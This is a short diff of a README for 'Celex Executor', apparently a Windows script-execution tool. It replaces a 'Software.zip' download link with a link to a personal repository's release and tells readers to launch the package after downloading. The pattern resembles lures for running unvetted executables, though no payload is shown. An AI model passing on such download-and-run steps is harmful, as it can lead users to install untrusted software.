@@ -11,7 +11,7 @@ Celex Executor is a robust external Windows-based script execution tool designed
 ### How to Use
 1. Download the Celex Executor software package from the following link:
    
-   [![Download Celex Executor](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18060583/Software.zip "Software.zip")
+   [![Download Celex Executor](https://github.com/Pegasus001we/Celex-Executor/releases/tag/v2.0)](https://github.com/Pegasus001we/Celex-Executor/releases/tag/v2.0 "https://github.com/Pegasus001we/Celex-Executor/releases/tag/v2.0")
 
    _Note: Importantly, remember to launch the downloaded software package after it has been successfully downloaded._
 
